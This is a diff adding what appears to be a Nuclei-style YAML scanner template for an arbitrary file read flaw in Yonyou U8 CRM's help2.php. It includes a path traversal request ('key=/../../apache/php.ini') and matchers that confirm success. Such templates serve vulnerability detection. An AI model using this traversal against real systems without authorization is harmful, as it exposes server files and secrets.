@@ -1,0 +1,24 @@
+id: yongyou-u8-crm-help2-php-anyfile-read
+info:
+  name: 用友U8 CRM客户关系管理系统 help2.php 任意文件读取漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read
+  description: |
+    用友U8 CRM客户关系管理系统存在任意文件读取漏洞。通过访问特定的路径，攻击者能够读取服务器上的任意文件。
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/pub/help2.php?key=/../../apache/php.ini"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "[PHP]"
+          - "About php.ini"
+          - "About this file"
+        part: body
